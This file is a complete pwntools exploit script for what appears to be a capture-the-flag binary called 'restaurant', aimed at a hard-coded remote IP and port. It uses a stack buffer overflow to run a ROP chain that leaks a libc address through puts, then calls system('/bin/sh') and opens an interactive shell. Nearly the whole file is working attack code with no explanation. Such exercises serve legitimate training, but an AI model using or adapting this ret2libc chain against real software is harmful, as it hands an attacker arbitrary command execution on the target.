#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template ./restaurant --host 83.136.254.163 --port 39450
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF(args.EXE or './restaurant_patched')

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR
# ./exploit.py GDB HOST=example.com PORT=4141 EXE=/tmp/executable
host = args.HOST or '83.136.254.163'
port = int(args.PORT or 39450)

def start_local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def start_remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return start_local(argv, *a, **kw)
    else:
        return start_remote(argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
tbreak main
b *0x400eeb
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     amd64-64-little
# RELRO:    Full RELRO
# Stack:    No canary found
# NX:       NX enabled
# PIE:      No PIE (0x400000)

io = start()

offset = 40
pop_rdi_ret = 0x00000000004010a3

io.sendlineafter(b'>', b'1')

rop = ROP(exe)
rop.puts(exe.got['printf'])
rop.main()

payload = b'a' * offset + rop.chain()

io.sendlineafter(b'>', payload)
ret = io.recvlines(2)[1].strip()
leak = ret[-6:].ljust(8, b'\x00')
leak = u64(leak)
print(f'leak: {hex(leak)}')

libc_exe = ELF('./libc.so.6')
libc_base_addr = leak - libc_exe.symbols['printf']
print(f'libc base address: {hex(libc_base_addr)}')
libc_exe.address = libc_base_addr

system_addr = libc_exe.symbols['system']
bin_sh_addr = next(libc_exe.search(b'/bin/sh'))

io.sendlineafter(b'>', b'1')
rop = ROP([exe, libc_exe])
rop.raw(rop.find_gadget(['ret'])[0])
rop.system(bin_sh_addr)
payload = b'a' * offset + rop.chain()
io.sendlineafter(b'>', payload)

io.interactive()

